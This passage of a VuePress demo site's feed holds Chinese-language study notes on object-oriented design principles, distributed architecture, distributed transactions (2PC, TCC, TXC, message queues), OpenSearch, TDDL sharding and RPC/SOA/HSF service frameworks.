<h2 id="其他常见原则" tabindex="-1"> 其他常见原则</h2>
<p>除了上述的经典原则，在实际开发中还有下面这些常见的设计原则。</p>
<table>
<thead>
<tr>
<th style="text-align:center">简写</th>
<th style="text-align:center">全拼</th>
<th style="text-align:center">中文翻译</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">LOD</td>
<td style="text-align:center">The Law of Demeter</td>
<td style="text-align:center">迪米特法则</td>
</tr>
<tr>
<td style="text-align:center">CRP</td>
<td style="text-align:center">The Composite Reuse Principle</td>
<td style="text-align:center">合成复用原则</td>
</tr>
<tr>
<td style="text-align:center">CCP</td>
<td style="text-align:center">The Common Closure Principle</td>
<td style="text-align:center">共同封闭原则</td>
</tr>
<tr>
<td style="text-align:center">SAP</td>
<td style="text-align:center">The Stable Abstractions Principle</td>
<td style="text-align:center">稳定抽象原则</td>
</tr>
<tr>
<td style="text-align:center">SDP</td>
<td style="text-align:center">The Stable Dependencies Principle</td>
<td style="text-align:center">稳定依赖原则</td>
</tr>
</tbody>
</table>
<h3 id="_1-迪米特法则" tabindex="-1"> 1. 迪米特法则</h3>
<p>迪米特法则又叫作最少知识原则（Least Knowledge Principle，简写 LKP），就是说一个对象应当对其他对象有尽可能少的了解，不和陌生人说话。</p>
<h3 id="_2-合成复用原则" tabindex="-1"> 2. 合成复用原则</h3>
<p>尽量使用对象组合，而不是通过继承来达到复用的目的。</p>
<h3 id="_3-共同封闭原则" tabindex="-1"> 3. 共同封闭原则</h3>
<p>一起修改的类，应该组合在一起（同一个包里）。如果必须修改应用程序里的代码，我们希望所有的修改都发生在一个包里（修改关闭），而不是遍布在很多包里。</p>
<h3 id="_4-稳定抽象原则" tabindex="-1"> 4. 稳定抽象原则</h3>
<p>最稳定的包应该是最抽象的包，不稳定的包应该是具体的包，即包的抽象程度跟它的稳定性成正比。</p>
<h3 id="_5-稳定依赖原则" tabindex="-1"> 5. 稳定依赖原则</h3>
<p>包之间的依赖关系都应该是稳定方向依赖的，包要依赖的包要比自己更具有稳定性。</p>
<h1 id="参考资料" tabindex="-1"> 参考资料</h1>
<ul>
<li>Java 编程思想</li>
<li>敏捷软件开发：原则、模式与实践</li>
<li><a href="http://www.cnblogs.com/shanyou/archive/2009/09/21/1570716.html" target="_blank" rel="noopener noreferrer">面向对象设计的 SOLID 原则</a></li>
<li><a href="http://design-patterns.readthedocs.io/zh_CN/latest/read_uml.html#generalization" target="_blank" rel="noopener noreferrer">看懂 UML 类图和时序图</a></li>
<li><a href="http://www.cnblogs.com/wolf-sun/p/UML-Sequence-diagram.html" target="_blank" rel="noopener noreferrer">UML 系列——时序图（顺序图）sequence diagram</a></li>
<li><a href="http://blog.csdn.net/jianyuerensheng/article/details/51602015" target="_blank" rel="noopener noreferrer">面向对象编程三大特性 ------ 封装、继承、多态</a></li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">中间件</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">分布式架构</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li></li>
</ul>

<h1 id="分布式架构" tabindex="-1"> 分布式架构</h1>
<p>一般来说，相对于单机架构系统，分布式系统可以从以下三个方面获得收益和增强：</p>
<p>1.扩展性
这是一个系统对所要处理的持续增长的任务的适应能力和兼容能力，可用以下三种扩展性来概括：1）集群规模扩展性：整体服务性能可以随集群机器数量线性增长；2）地理扩展性：能够使用不同地区的数据中心以抵消地理因素带来的延迟；3）管理扩展性：集群数量的上升不会导致管理复杂度快速上升。</p>
<p>2.性能
所谓的性能优良的系统应该具备三个特质：短RT、低延迟，高吞吐和较低的计算资源占用率。</p>
<p>这里值得一提的是延迟和吞吐。延迟lantency英语本意是潜伏期，在分布式领域中描述的是 ‘从事件发生到 可被观测到’ 之间的时间间隔。数据从开始被写入，到磁盘持久化成功，花了100ms，但是这期间没有任何第三方能够观察到此次写入的变更结果，再过了100ms，终于有第三方能够观察到此次写入的最新结果。这里的”延迟“ 为  200ms，而非100ms。 吞吐可以简单理解为单位时间内最多能处理请求数量。</p>
<p>3.可用性
可用性=可用时间/(可用时间+不可用时间)，可用性百分比越高，难度越高 。提升系统可用性的关键一点：在设计阶段就需要考虑容错性(Fault  tolerance) ，即“面向失败的设计”。那么如何把一个单系统应用快速改造成分布式应用呢，我们需要考虑如何提供分布式的服务，如何用分布式缓存，分布式数据库等等。</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-15-31-00.png" alt="" loading="lazy"></p>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">分布式事务解决方案</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
</ul>

<p>分布式事务是指事务的参与者、支持事务的服务器、资源服务器以及事务管理器分别位于不同的 分布式系统 的不同节点之上。</p>
<h1 id="分布式事务解决方案" tabindex="-1"> 分布式事务解决方案</h1>
<h2 id="两阶段提交" tabindex="-1"> 两阶段提交</h2>
<p>两阶段提交，是实现分布式事务的成熟方案。第一阶段是表决阶段，是所有参与者都将本事务能否成功的反馈发给协调者；第二阶段是执行阶段，协调者根据所有参与者的反馈，通知所有参与者，步调一致地在所有分支上提交，或者在所有分支上回滚。</p>
<p>缺点</p>
<ol>
<li>同步阻塞：所有事务参与者在等待其它参与者响应的时候都处于同步阻塞状态，无法进行其它操作。</li>
<li>单点问题：协调者在 2PC 中起到非常大的作用，发生故障将会造成很大影响。特别是在阶段二发生故障，所有参与者会一直等待，无法完成其它操作。</li>
<li>数据不一致：在阶段二，如果协调者只发送了部分 Commit 消息，此时网络发生异常，那么只有部分参与者接收到 Commit 消息，也就是说只有部分参与者提交了事务，使得系统数据不一致。</li>
<li>太过保守：任意一个节点失败就会导致整个事务失败，没有完善的容错机制。</li>
</ol>
<h2 id="tcc" tabindex="-1"> TCC</h2>
<p>TCC（Try、Confirm、Cancel）是两阶段提交的一个变种。TCC提供了一个框架，需要应用程序按照该框架编程，将业务逻辑的每个分支都分为Try、Confirm、Cancel三个操作集。TCC让应用程序自己定义数据库操作的粒度，使得降低锁冲突、提高吞吐量成为可能。</p>
<h1 id="txc" tabindex="-1"> TXC</h1>
<h2 id="应用场景" tabindex="-1"> 应用场景</h2>
<p>TXC的目标应用场景是：解决在分布式应用中，多条数据库记录被修改而可能带来的一致性问题；该分布式应用可以接受最终一致性；该应用的事务改造对工作量有较严格的限制</p>
<ul>
<li>跨多分库的分布式数据库事务场景</li>
<li>跨多数据库的事务场景</li>
<li>跨数据库系统、消息系统的事务场景</li>
<li>跨服务的事务场景</li>
</ul>
<h2 id="架构" tabindex="-1"> 架构</h2>
<ul>
<li>客户端（TXC-Client），资源管理器（RM），事务协调器（TXC-Server）。
客户端与事务协调器间，资源管理器与事务协调器间都是通过TXC分布式事务协议进行通信。客户端负责界定事务边界，开启/提交/回滚全局事务，</li>
<li>资源管理器负责管理资源，支持的资源包括：TDDL/DRDS，Oracle，MySQL，RDS，PgSQL，H2，MQ，MetaQ，Notify，后续计划根据实际业务需求支持更多类型资源。</li>
<li>事务协调器，也就是TXC服务器，负责协调整个事务过程，是分布式事务处理的大脑。</li>
</ul>
<p>TXC事务可以通过RPC框架和消息中间件进行事务传递，把整个业务调用链路或者消息链路串在一个分布式事务，极大简化应用开发。</p>
<h2 id="txc分阶段提交事务" tabindex="-1"> TXC分阶段提交事务</h2>
<p>TXC通过两阶段提交方式进行分布式事务推进。客户端向事务协调器注册全局事务作为一阶段的开启的标记；分布式事务内的每一次资源（DB或消息）操作，均通过资源管理器进行，资源管理器向事务协调器注册一个事务分支；客户端通知事务协调器进行全局提交／全局回滚作为一阶段完成的标记。</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-14-34-21.png" alt="" loading="lazy"></p>
<p>TXC分布式事务的二阶段由事务协调器驱动，驱动所有事务分支执行提交或回滚操作，一旦确定某个分布式事务提交或回滚，则不断重试所有事务分支，直到完成整个分布式事务提交或回滚。</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-14-34-29.png" alt="" loading="lazy"></p>
<h2 id="软件结构" tabindex="-1"> 软件结构</h2>
<p>TXC使用diamond实现软负载均衡，支持自动化的扩容和缩容，在业务规模发生变化时不对业务产生影响，并消除了事务协调器的单点故障风险。</p>
<p>业务方可通过TXC客户端API接入TXC事务，当调用已经接入TXC事务的HSF服务时，HSF服务会自动加入当前的全局事务，最大程度降低业务的开发成本。</p>
<p>TXC分布式事务中间件提供多种资源器支持，目前，已经完成TDDL、DRDS、Notify、MetaQ接入。</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-14-40-38.png" alt="" loading="lazy"></p>
<h1 id="消息队列实现分布式事务" tabindex="-1"> 消息队列实现分布式事务</h1>
<ul>
<li>通过两阶段提交来实现事务的，事务消息都保存在单独的主题上</li>
<li>消息预发送机制：如果业务执行成功，再去发消息，此时如果还没来得及发消息，业务系统就已经宕机了，系统重启后，根本没有记录之前是否发送过消息，这样就会导致业务执行成功，消息最终没发出去的情况。</li>
</ul>
<h2 id="rocketmq实现" tabindex="-1"> RocketMQ实现</h2>
<p>通过“半消息”来实现的
<img src="@source/assets/cs-note/distribute/mk-2020-07-12-14-12-40.png" alt="" loading="lazy"></p>
<ul>
<li>producer发送half消息</li>
<li>broker确认half消息，并通知producer，表示消息已经成功发送到broker（这个过程其实就是步骤1broker的返回）</li>
<li>producer收到half确认消息之后，执行自己本地事务，并将事务结果（UNKNOW、commit、rollback）告诉broker（这是一个oneway消息，而且失败不重试）</li>
<li>broker收到producer本地事务的结果后决定是否投递消息给consumer</li>
<li>鉴于producer发送本地事务结果可能失败，broker会定时扫描集群中的事务消息，然后回查</li>
</ul>
<h2 id="kafka" tabindex="-1"> kafka</h2>
<p>直接将消息发送给对应的topic，通过客户端来过滤实现的</p>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">OpenSearch</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E6%90%9C%E7%B4%A2.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E6%90%9C%E7%B4%A2.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li></li>
<li></li>
<li>
<ul>
<li></li>
</ul>
</li>
</ul>
</li>
<li></li>
</ul>

<h1 id="opensearch" tabindex="-1"> OpenSearch</h1>
<h2 id="简介" tabindex="-1"> 简介</h2>
<p>开放搜索（OpenSearch）是一款结构化数据搜索托管服务，为移动应用开发者和网站站长提供简单、高效、稳定、低成本和可扩展的搜索解决方案。</p>
<p>OpenSearch基于阿里巴巴自主研发的大规模分布式搜索引擎平台，该平台承载了阿里巴巴全部主要搜索业务，包括淘宝、天猫、一淘、1688、ICBU、神马搜索等业务。OpenSearch以平台服务化的形式，将专业搜索技术简单化、低门槛化和低成本化，让搜索引擎技术不再成为客户的业务瓶颈，以低成本实现产品搜索功能并快速迭代。</p>
<h2 id="产品特性" tabindex="-1"> 产品特性</h2>
<ul>
<li>支持文档索引结构定制，以及自由修改
OpenSearch将搜索引擎复杂的索引结构概念简单化、可视化和自助定制化。开发者可以通过控制台创建搜索实例，定制文档字段的结构和属性，包括字段名称、类型、分词方式、搜索属性等。搜索实例在运行过程中可以自由修改，满足了产品快速变化的需求，极大缩短了需求变更到上线的过程。</li>
<li>支持多种数据接入方式，数据自动同步更新
开发者的数据如果在阿里云的云存储服务（RDS、OSS、ODPS等）上，开发者是需要在OpenSearch控制台中授权，数据皆可以自动同步至OpenSearch中，后续数据的更新也可以自动实时同步（ODPS除外）。而且在同一区域中，从云存储同步数据至OpenSearch免收流量费。书局不在阿里云上的开发者，可以通过RESTfulAPI或者SDK上传数据，小数据量也可以直接在控制台上传。</li>
<li>支持多表，插件式数据处理
类似于数据库，每个搜索实例可以创建一张或多张表，每张表的字段上可以内置数据处理插件，对字段内容做文本处理和转换，例如拼音转换、HTML标签剔除、JSON数据解释等，多个表可以Join在一起实现多表联合查询。数据存放在RDS数据库里的开发者，可以用此功能代替数据库全文检索，实现更高的性能和搜索体验。</li>
<li>支持搜索结果相关性两阶段排序定制，线上实时相关性调试
用户使用搜索功能的目的是从海量数据中找到自己想要得信息，搜索结果相关性排序是影响用户体验的最关键的一环。OpenSearch支持开发者定制两轮相关性排序规则来准确控制搜索结果的排序。
<ul>
<li>第一轮为粗排，从命中的文档集合里选出相关文档。支持配置字段、文本相关性和时效性算分特征的权重。</li>
<li>第二轮为精排，对粗排的结果做更精细筛选，支持任意复杂的表达式和语法。这样做除了方便开发者能准确控制排序效果之外，更重要的是能优化系统性能，提高搜索相应速度。开发者可以通过排序规则直接在控制台中调试效果，并在效果满意后直接切换到线上</li>
</ul>
</li>
</ul>
<h2 id="产品架构" tabindex="-1"> 产品架构</h2>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-13-56-46.png" alt="" loading="lazy"></p>
<ul>
<li>白色线为实时数据处理流</li>
<li>红色线为全量数据处理流</li>
<li>黑色线为搜索流程</li>
</ul>
<p>开发者通过控制台和API与系统交互。典型的使用流程是开发者进入控制台，创建应用实例，配置应用字段结构、搜索属性，配置文本处理插件、定制相关性排序规则等。应用实例创建完成后，开发者再通过SDK/API将数据推送至云端（阿里云存储用户可以配置数据自动同步，只需在控制台中授权），数据实时流式进入Import子系统的数据导入服务模块(iStream Service)，经过格式解析和数据处理后，存储在结构化数据存储系统中。随后，Dump子系统的数据导出服务(iStream Service)将数据经过一定处理后发送给实时消息队列系统(Swift)，搜索系统(HA3)从消息队列中订阅数据，在内存中构建索引并提供搜索服务。这个数据实时流式处理过程（白色箭头）大概十秒左右。</p>
<p>当开发者修改了索引结构，需要对应用中的数据做增量索引重建。为了保证搜索效率，系统也会定期对所有数据做全量重建索引。索引重建流程参见红色箭头，这是一个非实时的流程，依数据大小不同可能需要几分钟到十几分钟，全量索引重建则需要数小时。</p>
<p>数据在云端经过一系列处理和索引构建后，开发者就可以通过API搜索应用实例中的数据。搜索请求首先发送到查询聚合服务Aggregator。</p>
<p>如果开发者配置了查询改写处理逻辑（即将上线），Aggregator会将查询请求发送给查询改写服务QP，QP按照开发者配置的处理规则（例如：拼写纠错、同义词或者查询语义改写）改写查询请求，并将改写后的查询回传给Aggregator，Aggregator最终将查询请求发送给搜索系统HA3，HA3根据开发者定制的相关性排序规则对命中的结果文档排序，并最终通过Aggregator将结果返回给开发者。</p>
<p>为了保证不同开发者各个应用数据推送和搜索相互不受影响，资源合理利用。配额管理服务（Quota Server）会对进入系统的数据和搜索请求频率依据开发者的配额（文档总量、QPS）做限流控制。超出配额部分的数据推送将失败，查询请求将随机丢弃。</p>
<h3 id="引擎ha3" tabindex="-1"> 引擎HA3</h3>
<p>HA3是阿里自主研发的新一代分布式实时搜索系统，中文名叫问天3，具备自动容灾、动态扩容、秒级实时等能力。下图是HA3系统模块组成图。</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-14-00-30.png" alt="" loading="lazy"></p>
<p>其中，Admin是整个系统的大脑，负责节点角色分配、调度决策、FailOver处理、状态监测、动态扩容等。Amonitor是系统的性能状态监控模块，收集和展示整个系统所有节点的性能参数。QRS是查询解析和改写服务，是系统对外的搜索接口。Proxy是搜索代理模块，负责接收QRS的查询请求，并转发给下辖的所有Searcher节点。Searcher节点执行实际的查询匹配计算，将搜索结果汇总后回传给QRS。</p>
<h1 id="solr" tabindex="-1"> Solr</h1>
<p>Solr是一个基于Lucene的Java搜索引擎服务器。Solr 提供了层面搜索、命中醒目显示并且支持多种输出格式（包括 XML/XSLT 和 JSON 格式）。它易于安装和配置，而且附带了一个基于 HTTP 的管理界面。Solr已经在众多大型的网站中使用，较为成熟和稳定。Solr 包装并扩展了 Lucene，所以Solr的基本上沿用了Lucene的相关术语。更重要的是，Solr 创建的索引与 Lucene 搜索引擎库完全兼容。通过对 Solr 进行适当的配置，某些情况下可能需要进行编码，Solr 可以阅读和使用构建到其他 Lucene 应用程序中的索引。此外，很多 Lucene 工具（如Nutch、 Luke）也可以使用 Solr 创建的索引。</p>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">TDDL</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E6%95%B0%E6%8D%AE%E5%BA%93.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E6%95%B0%E6%8D%AE%E5%BA%93.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[

<h1 id="tddl" tabindex="-1"> TDDL</h1>
<h2 id="产生背景" tabindex="-1"> 产生背景</h2>
<p>一开始的时候，由于数据量比较少，数据库最长见的是单库单表的情况。随着业务的发展，业务库中的数据量不断增长。单库的性能已经不能再支持业务的发展。我们开始使用对数据库进行分库分表和读写分离的方式，来分散数据库的压力，提高整体的性能。</p>
<ul>
<li>单库单表
通常刚开始的时候，应用的数据比较少，也不会很复杂，所以应用只有一个数据库，数据库中的表是一张完整的表，这也是我们刚开始接触数据库时的数据库形态。</li>
<li>读写分离随着业务的发展，数据量与数据访问量不断增长，很多时候应用的主要业务是读多写少的，比如说一些新闻网站，运营在后台上传了一堆新闻之后，所有的用户都会去读取这些新闻资讯，因此数据库面临的读压力远大于写压力，那么这时候在原来数据库 Master 的基础上增加一个备用数据库 Slave，备库和主库存储着相同的数据，但只提供读服务，不提供写服务。以后的写操作以及事务中的读操作就走主库，其它读操作就走备库，这就是所谓的读写分离。读写分离会直接带来两个问题：
<ul>
<li><strong>数据复制问题</strong>：因为最新写入的数据只会存储在主库中，之后想要在备库中读取到新数据就必须要从主库复制过来，这会带来一定的延迟，造成短期的数据不一致性。但这个问题应该也没有什么特别好的办法，主要依赖于数据库提供的数据复制机制，常用的是根据数据库日志 binary-log 实现数据复制。</li>
<li><strong>数据源选择问题</strong>：读写分离之后我们都知道写要找主库，读要找备库，但是程序不知道，所以我们在程序中应该根据 SQL 来判断出是读操作还是写操作，进而正确选择要访问的数据库。</li>
</ul>
</li>
<li>垂直分库数据量与访问量继续上升时，主备库的压力都在变大，这时候可以根据业务特点考虑将数据库垂直拆分，即把数据库中不同的业务单元的数据划分到不同的数据库里面。比如说，还是新闻网站，注册用户的信息与新闻是没有多大关系的，数据库访问压力大时可以尝试把用户信息相关的表放在一个数据库，新闻相关的表放在一个数据库中，这样大大减小了数据库的访问压力。垂直分库会带来以下问题：
<ul>
<li>ACID 被打破：数据分到不同的数据库之后，原来的事务操作将会受很大影响，比如说注册账户的时候需要在用户表和用户信息表中插入一条数据，单机数据库利用事务可以很好地完成这个任务，但是多机将会变得比较麻烦。以下两点也是因为数据库在不同的机子上而导致简单的操作变得复杂，不一一分析了。</li>
<li>Join 操作困难</li>
<li>外键约束受影响</li>
</ul>
</li>
<li>水平分表经过长时间积累，特别对于 ugc 的业务，数据量会达到惊人的地步，每张表存放着大量的数据，任何 CRUD 都变成了一次极其消耗性能的操作，这个时候就会考虑水平分表，把一张表内大量的数据拆分成多张子表，比如说原来一张表中存放 50000 条数据，水平分成 5 张表之后，每张表只要存放 10000 条数据。这种结构可以比较容易的存储和维护海量数据。水平分表会在垂直分库的基础上带来更多的影响：
<ul>
<li>自增主键会有影响：这个影响很明显，分表中如果使用的是自增主键的话，那么就不能产生唯一的 ID 了，因为逻辑上来说多个分表其实都属于一张表，自增主键无法标识每一条数据。</li>
<li>有些单表查询会变成多表：比如说 count 操作，原来是一张表的问题，现在要从多张分表中共同查询才能得到结果。</li>
</ul>
</li>
</ul>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-13-28-49.png" alt="" loading="lazy"></p>
<h2 id="应用场景" tabindex="-1"> 应用场景</h2>
<ul>
<li>读写分离</li>
<li>分库分表</li>
<li>动态数据源</li>
<li>主备切换</li>
</ul>
<p>TDDL 主要解决了以下问题：</p>
<ol>
<li>单机数据库容量瓶颈： 随着数据量和访问量的增长，单机数据库会遇到很大的挑战，依赖硬件升级并不能完全解决问题。</li>
<li>单机数据库扩展困难：传统数据库容量扩展往往意味着服务中断，很难做到业务无感知或者少感知。</li>
<li>传统数据库使用成本高。</li>
<li>跨语言支持：基于 TDDL 的 Corona 产品提供跨语言支持。Corona 是一个 MySQL 的 proxy，提供标准的 MySQL 协议。因此，用户可以像使用 MySQL 一样使用 Corona，从而提供跨语言支持。</li>
</ol>
<h2 id="整体架构" tabindex="-1"> 整体架构</h2>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-13-29-36.png" alt="" loading="lazy"></p>
<p>客户端架构
<img src="@source/assets/cs-note/distribute/mk-2020-07-12-13-30-03.png" alt="" loading="lazy"></p>
<p>服务端架构
<img src="@source/assets/cs-note/distribute/mk-2020-07-12-13-30-14.png" alt="" loading="lazy"></p>
<h3 id="tddl三层数据源关系" tabindex="-1"> TDDL三层数据源关系</h3>
<p>Matrix（TDataSource）实现分库分表逻辑，持有多个Group实例；</p>
<p>Group（TGroupDataSource）实现数据库的主备切换，读写分离逻辑，持有多个Atom实例；</p>
<p>Atom（TAtomDataSource）实现数据库ip，port，password，connectionProperties等信息的动态推送，持有原子的数据源（分离的Jboss数据源）。</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-13-30-32.png" alt="" loading="lazy"></p>
<ul>
<li>Matrix层：Matrix层主要负责的是SQL的解析，优化，执行。这一层主要解决了分库分表对应用透明化的问题。应用在这一层看到的表是作为一个单表来看待的。</li>
<li>Group层：读写分离与主备切换带来的问题由 Group 层解决</li>
<li>Atom层：Atom层主要是由物理DB组成，负责管理DB的链接状态，给上层提供服务。DB一般都是有主库和备库组成</li>
</ul>
<h2 id="tddl高级特性" tabindex="-1"> TDDL高级特性</h2>
<h3 id="tddl分库分表" tabindex="-1"> TDDL分库分表</h3>
<h3 id="tddl-sequence" tabindex="-1"> TDDL Sequence</h3>
<ul>
<li>主键唯一性</li>
<li>全局ID</li>
<li>高并发场景下的唯一ID</li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">介绍</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E6%9C%8D%E5%8A%A1.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E6%9C%8D%E5%8A%A1.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
</ul>
</li>
</ul>

<h1 id="介绍" tabindex="-1"> 介绍</h1>
<p>一般意义上，一个公司的业务系统发展脉络基本都是类似，从单体应用到多应用，从本地调用到远程调用，随着发展需要对远程服务进行高效的资源管理，这个过程是系统应对变化和复杂的应对之道。</p>
<h2 id="rpc" tabindex="-1"> RPC</h2>
<p>RPC（Remote Process Call），即远程服务调用，被广泛地应用在很多企业应用中，是早期主要的服务治理方案，其流程较为简单，客户端consumer携带参数发送RPC请求到服务提供方provider，provider根据参数路由到具体函数，方法，并将执行获得的结果返回，至此一次RPC调用完成。</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-11-11-16.png" alt="" loading="lazy"></p>
<p>随着业务的发展，大数据时代的到来，服务提供方的压力也日益增大，单机应用的处理能力无论在软件，硬件上都受到限制，provider也不可能一直无限扩容，即使扩容，也存在着很多问题，即服务的路由，和Consumer的负载均衡问题。因此，分布式服务架构应运而生，RPC发展到一定阶段思考的变革，成为了分布式服务，云计算的计算机基础。</p>
<h2 id="soa" tabindex="-1"> SOA</h2>
<p>由于简单的RPC调用已经不能随着时代发展满足需求，因此复杂的业务逻辑对于分布式应用架构体系的需求愈发强烈，业务希望自己的服务是分布式部署的，请求是分流的，对数据的操作是能读写分离的，同时能屏蔽许多复杂需要自己编写的底层服务，借助已有的公共服务，去快速的构建自己的应用，降低人力开发维护的成本和提高应用交付的效率，基因此，基于分布式服务思想的SOA（Service-Oriented Architecture）成了新的受追捧的架构。常见的SOA服务调用流程图如下：</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-11-11-54.png" alt="" loading="lazy"></p>
<h1 id="框架" tabindex="-1"> 框架</h1>
<h2 id="hsf" tabindex="-1"> HSF</h2>
<p>HSF (High-speed Service Framework)，高速服务框架，是在阿里巴巴内部广泛使用的分布式 RPC 服务框架。</p>
<h3 id="功能角色" tabindex="-1"> 功能角色</h3>
<p>HSF功能结构上分为6个部分，分别是：服务消费方、服务提供方、地址注册中心、持久化配置中心、元数据存储中心和HSF运维平台（HSF 控制台），它们组合在一起可以提供全功能的分布式服务，其中必须的是服务消费方、服务提供方和地址注册中心，上述功能结构的描述如下表：</p>
<table>
<thead>
<tr>
<th style="text-align:left">名称</th>
<th style="text-align:center">是否必须</th>
<th style="text-align:left">功能描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">服务消费方</td>
<td style="text-align:center">是</td>
<td style="text-align:left">消费服务提供方提供的服务，服务消费者通过地址注册中心订阅服务，根据订阅到的地址信息发起调用，地址注册中心作为旁路不参与调用</td>
</tr>
<tr>
<td style="text-align:left">服务提供方</td>
<td style="text-align:center">是</td>
<td style="text-align:left">服务提供方会绑定一个端口（一般是12200），接受请求并提供服务，同时将地址信息发布到地址注册中心</td>
</tr>
<tr>
<td style="text-align:left">地址注册中心</td>
<td style="text-align:center">是</td>
<td style="text-align:left">接受服务提供方发布的地址，当服务消费方根据服务进行订阅时，会将地址信息推送给服务消费方，注册中心就是服务信息的中介，提供服务发现的能力</td>
</tr>
<tr>
<td style="text-align:left">持久化配置中心</td>
<td style="text-align:center">否</td>
<td style="text-align:left">持久化的配置中心用于存储 HSF 服务的各种治理规则，HSF 客户端在启动的过程中会向持久化配置中心订阅各种服务治理规则，如路由规则、归组规则、权重规则等，从而根据规则对调用过程的选址逻辑进行干预</td>
</tr>
<tr>
<td style="text-align:left">元数据存储中心</td>
<td style="text-align:center">否</td>
<td style="text-align:left">元数据是指 HSF 服务对应的方法列表以及参数结构等信息，元数据不会对 HSF 的调用过程产生影响，因此元数据存储中心也并不是必须的。但考虑到服务运维的便捷性，HSF客户端在启动时会将元数据上报到元数据存储中心，以便提供给服务运维使用</td>
</tr>
<tr>
<td style="text-align:left">HSF运维平台</td>
<td style="text-align:center">否</td>
<td style="text-align:left">HSF 控制台通过打通地址注册中心 ConfigServer、持久化配置中心 Diamond、元数据存储中心 Redis，为用户提供了一些列服务运维功能，包括服务查询、服务治理规则管理、服务测试、服务 Mock、单机运维等，旨在提高 HSF 服务研发的效率、运维的便捷性</td>
</tr>
</tbody>
</table>
<p><img src="@source/assets/cs-note/distribute/mk-2020-08-19-15-25-26.png" alt="" loading="lazy"></p>
